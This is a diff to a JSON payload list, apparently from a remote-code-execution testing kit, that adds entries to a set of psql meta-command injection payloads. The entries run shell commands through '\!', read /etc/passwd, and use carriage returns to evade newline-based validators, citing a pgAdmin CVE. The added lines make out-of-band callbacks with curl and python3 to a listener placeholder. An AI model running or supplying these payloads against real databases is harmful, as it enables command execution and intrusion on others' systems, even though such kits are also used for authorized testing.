@@ -149,7 +149,9 @@
                     "SELECT 1;\n\\! cat /etc/passwd\n",
                     {"payload": "SELECT 1;\r\\! id\r", "notes": ["CR (\\r) separates the meta-command so a newline-based validator (e.g. pgAdmin CVE-2025-13780) does not detect the \\! line"]},
                     {"payload": "SELECT 1;\r\\! cat /etc/passwd\r", "notes": ["CR (\\r) meta-command bypass; psql still executes \\! after splitting on CR"]},
-                    {"payload": "SELECT 1;\r\\! bash -c 'id > /tmp/rcekit_{canary}'\r", "expected_channel": "response", "notes": ["blind sink: confirm out-of-band or via the written marker rather than the HTTP response"]}
+                    {"payload": "SELECT 1;\r\\! bash -c 'id > /tmp/rcekit_{canary}'\r", "expected_channel": "response", "notes": ["blind sink: confirm out-of-band or via the written marker rather than the HTTP response"]},
+                    {"payload": "SELECT 1;\r\\! curl -s {callback}\r", "notes": ["blind async sink: {callback} is filled by the chain runner with the OOB listener URL; confirmation is the received callback, not the HTTP response"]},
+                    {"payload": "SELECT 1;\r\\! python3 -c 'import urllib.request;urllib.request.urlopen(\"{callback}\")'\r", "notes": ["blind async sink, curl-free OOB callback via python3; confirmed by the received callback"]}
                 ]
             },
             "php": {
